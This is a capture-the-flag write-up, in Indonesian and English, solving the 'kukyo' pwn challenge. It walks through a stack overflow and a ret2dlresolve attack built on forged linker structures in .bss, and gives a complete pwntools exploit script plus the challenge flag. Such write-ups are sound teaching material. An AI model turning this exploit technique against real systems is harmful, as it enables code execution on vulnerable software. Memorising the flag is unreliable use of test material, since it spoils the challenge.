---
slug: "pwn-kukyo"
title: "kukyo"
competition: "PlayITPlus"
category: "Pwn"
difficulty: "Hard"
date: "2026-11-08"
updated: "2026-11-09"
summary: "ret2dlresolve with unexpected no gadget ahh."
tags: ["BUFFER OVERFLOW","RET2DLRESOLVE","HARD"]
status: "published"
flag: "PLAYITPLUS{773ed891fe2d30dfb9d67c6d7aac868efb542157929bc8636494a5b103225a6b}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-kukyo"
---

# kukyo

> ret2dlresolve with unexpected no gadget ahh.

![1794213593155945300.png](/assets/uploads/f84a6866-4c12-428a-9722-65d198e467b5-1794213593155945300.png)

## TL;DR

ret2dlresolve with unexpected no gadget ahh.

## Challenge

-   **Poin / solves:** 500 / 1
    
-   **Deskripsi:** A quiet little program takes two records and says nothing back. Can you make it tell you something useful?
    
-   Link aseli: [https://app.notion.com/p/kukyo-412d29486a2c80f6b040c5a1fb9aaf35?source=copy\_link](https://app.notion.com/p/kukyo-412d29486a2c80f6b040c5a1fb9aaf35?pvs=21)
    
-   AI: [https://chat.deepseek.com/share/fde2anjc20urpgdedh](https://chat.deepseek.com/share/fde2anjc20urpgdedh)
    

## Recon

Firstly, we checksec this challenge to know that is the protection and how to approach.

```bash
~/ctf/playit/pwn/kukyo
❯ checksec kukyo                                                                󰥔 13:28:10
[*] '/home/claritys/ctf/playit/pwn/kukyo/kukyo'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Yang nyala hanya `Partial RELRO` (tetep bisa `GOT overwrite`) dan `NX Enabled` (nggak bisa shellcode).

Sekarang kita decompile chall ini untuk mengetahui flownya.

```

//----- (000000000040115F) ----------------------------------------------------
ssize_t __fastcall exact(char *a1, size_t a2)
{
  ssize_t result; // rax
  ssize_t v4; // [rsp+10h] [rbp-10h]
  char *buf; // [rsp+18h] [rbp-8h]

  result = (ssize_t)a1;
  buf = a1;
  while ( a2 != 0 )
  {
    v4 = read(0, buf, a2);
    if ( v4 <= 0 )
      _exit(0);
    buf += v4;
    result = v4;
    a2 -= v4;
  }
  return result;
}

//----- (00000000004011BE) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[64]; // [rsp+0h] [rbp-40h] BYREF

  exact(ledger, 0x40u);
  exact(v4, 0xA0u);
  close(0);
  return 0;
}
```

## Vulnerability

Kita mulai dari function `main`, ada function `close(0)` yang di mana menjadikan kita nanti nggak bisa dapetin shell tetapi harus langsung direct ke tempat flagnya. Because `close(0)` dia menutup standard input, so we can’t input some character to run a command like `cat /flag.txt` when you got the `/bin/bash`.

For the function `exact`, dia cara kalau dipanggil nanti parameter pertama menjadi **ukuran** untuk menaruh inputan kita (tapi nggak ditaruh di situ), untuk parameter kedua itu untuk menentukan berapa byte input kita yang bisa kita masukkan ke function `read`.

But the catch is, jumlah input kita harus sama dengan paramer kedua (`a2`), karena `a2 != 0`. `a2` harus `= 0`. Biar nanti programnya bisa `return`.

Anyhow, there’s a mysterious function that does nothing at decompiler.

```
//----- (0000000000401156) ----------------------------------------------------
void handle()
{
  ;
}
```

But at the disassembly say the otherwise. This function is our key to fill the gaps for the `exploit`.

![image.png](/assets/uploads/d300ddba-de71-4037-9f41-44b101376be4-image.png)

Because after we search for the gadget that begins with `pop*` itu malah gak guna:

```bash

~/ctf/playit/pwn/kukyo
❯ ropper --file kukyo --search "pop"                                            󰥔 13:46:07
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: kukyo
0x000000000040113d: pop rbp; ret;
```

Jadi ya itu adalah kunci exploit kita function `handle`. Disassembly-nya si `handle` itu `lea rdi, [rsp+0x10] ; ret` jadi dia bikin `rdi` nunjuk ke stack yang kita kontrol. Ini **pengganti** `pop rdi` yang nggak ada di binary yang hanya ada `pop rbp; ret` dari ropper.

For the first call of the function `exact`, there’s a free write to `.bss`. Because dia dideklarasikan secara global dan static addressnya. Kita bisa ambil addressnya buat nanti:

```python
pwndbg> p& ledger
$1 = (<data variable, no debug info> *) 0x404038 <ledger>
```

Karena ini bisa berguna untuk ngasih `cat /flag.txt` atau semacamnya.

So as we can see, there’s a buffer overflow in the second call of the function `exact`.

```python
  exact(v4, 0xA0u);
```

Because if we simulate at the function exact, there will be a buffer overflow when it comes to this:

```python
    v4 = read(0, buf, a2);
```

Karena `a2` adalah si `0xA0` dan `buf` itu sizenya seperti `v4` yang bisa menampung `64` bytes aja. Jadi kita bisa overwrite return address di sini.

At first I thought this is a ret2libc challenge, but turns out this challenge is ret2dlresolve. Because there’s no leak.

Sekarang kita calculate offset yang ada di function `exact`.

```c
>>> 64 + 8
72
```

Yang di mana `64` itu ukuran si buffer kita yang dari `v4`, terus `8` untuk `Save RBP`.

## Exploit plan

Karena nggak ada leak (no `write`/`puts`/`system` di PLT). Jadi kita suruh **dynamic linker** resolve `system` sendiri berdasarkan nama, lewat fake `Elf64_Sym` + `Elf64_Rela` + string `"system"`. That’s ret2dlresolve.

1.  **Staging fake structure di** `ledger` **(**`0x404038`**).** Nggak usah repot nyari `pop rsi`/`pop rdx` buat nulis struktur `exact(ledger, 0x40)` udah ngasih **fixed-address write** 64 byte ke `.bss`. Pas banget buat ret2dlresolve yang emang butuh alamat absolut tetap (No PIE).
    
2.  **Muat-muatin di 64 byte ( di link ai deepseekx bilang ini Opsi C).** `Elf64_Sym` (24) + `"system\0"` (7) + `Elf64_Rela` (24) = 55 byte, muat. Tapi alamat `Sym`/`Rela` wajib bikin index-nya integer. Tabel: `SYMTAB 0x400390`, `STRTAB 0x400450`, `JMPREL 0x400580`, `read@got 0x404010`, `PLT0 0x401020`.
    

Dapet valuenya dari:

```python
~/ctf/playit/pwn/kukyo
❯ readelf -d kukyo                                                              󰥔 06:45:23

Dynamic section at offset 0x2df8 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
--- snippet ---
 0x000000006ffffef5 (GNU_HASH)           0x400370
 0x0000000000000005 (STRTAB)             0x400450 #catat
 0x0000000000000006 (SYMTAB)             0x400390 #catat
 0x000000000000000a (STRSZ)              138 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x403fe8
 0x0000000000000002 (PLTRELSZ)           72 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x400580 #catat
 0x0000000000000007 (RELA)               0x400520
 0x0000000000000008 (RELASZ)             96 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffe (VERNEED)            0x4004f0
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x4004da
 0x0000000000000000 (NULL)               0x0
```

```python
~/ctf/playit/pwn/kukyo
❯ readelf -r kukyo                                                                        󰥔 06:47:27

Relocation section '.rela.dyn' at offset 0x520 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403fc8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
000000403fd0  000200000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0
000000403fd8  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000403fe0  000700000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0

Relocation section '.rela.plt' at offset 0x580 contains 3 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404000  000300000007 R_X86_64_JUMP_SLO 0000000000000000 _exit@GLIBC_2.2.5 + 0
000000404008  000400000007 R_X86_64_JUMP_SLO 0000000000000000 close@GLIBC_2.2.5 + 0
000000404010  000500000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0 #catat
```

Terus ini buat `PLT0` nya:

![image.png](/assets/uploads/dcd372de-1205-43b4-9433-8eb0143764ad-image-1.png)

1.  `rdi` **dari stack, command di stack.** `handle` ngasih `rdi = rsp+0x10` = alamat **stack**, bukan ledger. Jadi string `"cat /flag.txt"` ditaruh di **stack** (nyambung di ROP chain), bukan di ledger. `cat`, bukan `/bin/sh`, gara-gara `close(0)` tadi.
    

Terus tinggal kita rakit deh payloadnya. Di sini untuk payload aku masih menyuruh Deepseek, tapi kalau gak salah ada function bawaan `pwntools` yang dia itu membantu banget jadi ngga usah ngerakit payload sepanjang ini dan serumit ini:

```python
    payload1 = p32(15360) + b"\x12\x00" + p16(0) + p64(0) + p64(0)   # Sym, 24 B
    payload1 += b"system\x00" + b"\x00"*9                            # string @+24, 16 B
    payload1 += p64(0x404010) + p64(0x0000028700000007) + p64(0)     # Rela @+40, 24 B

    payload2 = b"A"*72
    payload2 += p64(0x401156)          # handle  -> rdi = rsp+0x10
    payload2 += p64(0x401020)          # PLT0    -> return dari handle
    payload2 += p64(628)               # reloc_index, di [rsp] saat PLT0
    payload2 += b"cat /flag.txt\x00"   # rdi menunjuk ke sini
    payload2 += b"B"*(0xA0 - 72 - 8*3 - len("cat /flag.txt\x00"))  # isi sisa a2
```

We try to run it at locally and it works.

![image.png](/assets/uploads/ed17d4c9-c3d8-47de-abaa-2ae53f7ae470-image-2.png)

Now let’s do it remotely, but sadly pas aku nyoba remote itu ngga bisa. Terus aku lihat nggak bisa, jadi kemungkinan ini stack alignment.

![image.png](/assets/uploads/fd49b05d-e710-42c9-9584-825aad8da244-image-3.png)

Jadi kita tambahkan return sebelum ke `handle`.

```python
    ret = 0x000000000040115b #ini return address dari handle.
    payload1 = p32(15360) + b"\x12\x00" + p16(0) + p64(0) + p64(0)   # Sym, 24 B
    payload1 += b"system\x00" + b"\x00"*9                            # string @+24, 16 B
    payload1 += p64(0x404010) + p64(0x0000028700000007) + p64(0)     # Rela @+40, 24 B

    payload2 = b"A"*72
    payload2 += p64(ret) #buat stack alignment
    payload2 += p64(0x401156)          # handle  -> rdi = rsp+0x10
    payload2 += p64(0x401020)          # PLT0    -> return dari handle
    payload2 += p64(628)               # reloc_index, di [rsp] saat PLT0
    payload2 += b"cat /flag.txt\x00"   # rdi menunjuk ke sini
    payload2 += b"B"*(0xA0 - 72 - 8*3 - len("cat /flag.txt\x00"))  # isi sisa a2
```

Lalu setelah kita coba remote berhasil deh.

![image.png](/assets/uploads/3d85aed2-9b62-4ecd-83f0-852c4eb1bf94-image-4.png)

## Exploit

```python
~/ctf/playit/pwn/kukyo
❯ cat solve.py                                                                  󰥔 04:45:38
#!/usr/bin/env python3

from pwn import *

elf = ELF("kukyo")

context.binary = elf
context.terminal = ["ghostty", "-e"]
context.gdb_binary = "pwndbg"

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("10.0.2.3", 4267)

def main():
    r = conn()
    ret = 0x000000000040115b
    payload1 = p32(15360) + b"\x12\x00" + p16(0) + p64(0) + p64(0)   # Sym, 24 B
    payload1 += b"system\x00" + b"\x00"*9                            # string @+24, 16 B
    payload1 += p64(0x404010) + p64(0x0000028700000007) + p64(0)     # Rela @+40, 24 B

    payload2 = b"A"*72
    payload2 += p64(ret)
    payload2 += p64(0x401156)          # handle  -> rdi = rsp+0x10
    payload2 += p64(0x401020)          # PLT0    -> return dari handle
    payload2 += p64(628)               # reloc_index, di [rsp] saat PLT0
    payload2 += b"cat /flag.txt\x00"   # rdi menunjuk ke sini
    payload2 += b"B"*(0xA0 - 72 - 8*3 - len("cat /flag.txt\x00"))  # isi sisa a2
    r.send(payload1)
    r.send(payload2)

    # good luck pwning :)
    r.interactive()

if __name__ == "__main__":
    main()
```
